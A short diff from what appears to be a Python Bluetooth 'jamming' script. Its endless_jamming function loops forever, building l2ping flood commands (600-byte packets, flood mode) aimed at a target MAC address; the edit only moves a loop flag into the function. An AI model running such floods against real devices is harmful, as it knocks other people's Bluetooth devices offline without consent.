@@ -10,9 +10,9 @@ BTService = ("systemctl start bluetooth.service")
 subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 time = 999
 
-a = True
 def endless_jamming():
     try:
+        a = True
         while a:
             xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
             xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
